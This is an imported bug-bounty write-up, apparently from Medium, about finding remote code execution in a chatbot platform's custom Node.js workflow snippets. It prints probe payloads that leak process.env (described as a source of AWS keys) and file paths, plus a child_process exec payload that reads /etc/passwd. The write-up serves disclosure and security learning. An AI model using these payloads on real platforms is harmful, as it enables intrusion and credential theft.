---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-08-05_unveiling-remote-code-execution-in-ai-chatbot-workflows-_2.md
original_filename: 2024-08-05_unveiling-remote-code-execution-in-ai-chatbot-workflows-_2.md
title: Unveiling Remote Code Execution in AI chatbot workflows 💵
category: documents
detected_topics:
- command-injection
- automation-abuse
- webhooks
- cloud-security
tags:
- imported
- documents
- command-injection
- automation-abuse
- webhooks
- cloud-security
language: en
raw_sha256: b4e8949ef6db4fbdf719ca635861d74e3c7ba4c77f979f77e488bb3e9353da8f
text_sha256: e9bc1bc5421eb8b006f65ccbc78c2b57a00c8f903980626f1042f00825af299b
ingested_at: '2026-06-28T07:32:36Z'
sensitivity: unknown
redactions_applied: true
---

# Unveiling Remote Code Execution in AI chatbot workflows 💵

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-08-05_unveiling-remote-code-execution-in-ai-chatbot-workflows-_2.md
- Source Type: markdown
- Detected Topics: command-injection, automation-abuse, webhooks, cloud-security
- Ingested At: 2026-06-28T07:32:36Z
- Redactions Applied: True
- Raw SHA256: `b4e8949ef6db4fbdf719ca635861d74e3c7ba4c77f979f77e488bb3e9353da8f`
- Text SHA256: `e9bc1bc5421eb8b006f65ccbc78c2b57a00c8f903980626f1042f00825af299b`


## Content

---
title: "Unveiling Remote Code Execution in AI chatbot workflows 💵"
url: "https://varmaanu001.medium.com/unveiling-remote-code-execution-in-ai-chatbot-workflows-3c7f633f63c3"
authors: ["Anurag__Verma"]
bugs: ["AI", "Chatbot", "RCE"]
publication_date: "2024-08-05"
added_date: "2024-08-06"
source: "pentester.land/writeups.json"
original_index: 105
scraped_via: "browseros"
---

# Unveiling Remote Code Execution in AI chatbot workflows 💵

Unveiling Remote Code Execution in AI chatbot workflows 💵
Anurag__Verma
Follow
5 min read
·
Aug 6, 2024

102

1

Hi Readers 👋, this article goes through a remote code execution finding worth $$$$ that I found on one of the popular chatbot platforms so let's get started.

Introduction:

In recent years, AI chatbots have become increasingly popular across various industries, providing efficient customer service, enhancing user engagement, and streamlining business operations. These intelligent systems, driven by complex algorithms and natural language processing capabilities, are designed to interact with users seamlessly. However, like any software, they are not immune to security vulnerabilities.

One of the most critical types of security vulnerabilities is Remote Code Execution (RCE), which allows attackers to execute arbitrary code on a target system. RCE vulnerabilities pose significant risks, as they can lead to unauthorized access, data breaches, and complete control over affected systems.

During a recent security assessment, I discovered a Remote Code Execution vulnerability in a widely-used AI chatbot platform. This vulnerability was found within the chatbot’s custom workflow response code, a feature that allows developers to extend the bot’s functionality by creating tailored workflows. While these workflows are powerful tools for enhancing chatbot interactions, they can also introduce security risks if not properly secured.

In this article, I will share the journey of uncovering this vulnerability, delve into the technical details, and discuss its potential implications.

Background:

The target was a proper business management platform with multiple team management features, email management, chatbots etc.

Reference: https://nodejs.org/api/globals.html

while going through multiple features specific to the chatbot for automation, one of the features that caught my attention is the “Start from scratch” option as shown below.

Press enter or click to view image in full size

Now this option “Start from scratch” is composed of multiple options for customizing the automation for the chatbot for example: workflows, webhooks and custom code snippets as you can see in the below image.

After looking at the other options, I started exploring the “run a code snippet” option.

Press enter or click to view image in full size

Technical Details:

This feature contains customizable code for getting a custom response from the chatbot with sample functions like responseJson with botMessage parameter with a default value like “Hello World”

default snippet looks like this:

const responseJson = {
botMessage: "Hello world",
responseExpected: false
}

as the chatbot was built using Node 18.x framework I tried to get/check responses for the global variables like __dirname,__filename and tried to execute functions like eval(7*7) in place of “Hello World”.

This is how the response code looks while using global variables along with chatbot responses.

__dirname

const responseJson = {
botMessage: __dirname,
responseExpected: false
}
Press enter or click to view image in full size

you can observe I am getting “/var/task” as output in the chatbot it means the global variable __dirname executed internally and we are getting successful output.

let go for more leads,

__filename

const responseJson = {
botMessage: __filename,
responseExpected: false
}
Press enter or click to view image in full size

It also executed successfully returning the output “/var/task/Template.js”

eval(7*7)

const responseJson = {
botMessage: eval(7*7),
responseExpected: false
}
Press enter or click to view image in full size

These are some positive leads but aren’t much promising or sensitive for getting reported as RCE (remote code execution).

Get Anurag__Verma’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

At this point, I started looking at Nodejs official documentation and found some more global variables/objects to check for more data leaks.

you can find the official documentation here: https://nodejs.org/api/globals.html#process

such as process.env , process.argv process.execPath,process.memoryUsage(),process.getuid(),process.cpuUsage() etc

let's see response for these global objects:

process.env

const responseJson = {
botMessage: process.env,
responseExpected: false
}
Press enter or click to view image in full size

This is crucial to check the environment variable as these sometimes stores ***REDACTED-AWS-KEY*** and AWS_KEY and you may get a good reward at this point.

process.platform

const responseJson = {
botMessage: process.platform,
responseExpected: false
}
Press enter or click to view image in full size

process.execPath

const responseJson = {
botMessage: process.execPath,
responseExpected: false
}
Press enter or click to view image in full size

process.memoryUsage()

const responseJson = {
botMessage: process.memoryUsage(),
responseExpected: false
}
Press enter or click to view image in full size

Getting full RCE:

Till this point, we have some good leads like we are getting responses for almost every node global object and access to environment variables.

But still, I was looking for full RCE and tried to build some payloads for it after multiple tries, debugging and discussing with co-researchers I was able to create a full RCE payload which looked like this:

const { exec } = require('child_process');

exports.main = (event, callback) => {
exec('head /etc/passwd', (error, stdout, stderr) => {
if (error) {
console.error(exec error: ${error});
return;
}
if (stderr) {
console.error(stderr: ${stderr});
return;
}

const responseJson = {
  botMessage: stdout,
  responseExpected: false
};

callback(responseJson);
});
};

and here is how it was executed successfully.

getting /etc/passwd file (local file read)

running “id” command

This was how I managed to get full RCE successfully.

Thanks for reading!! Do give a clap if you like it

Reach me via 👇

Linkedin: https://www.linkedin.com/in/anurag-verma-650b771a2/

My Udemy courses: https://www.udemy.com/user/lets-hack-2/

For inquiries: varmaanu001@gmail.com
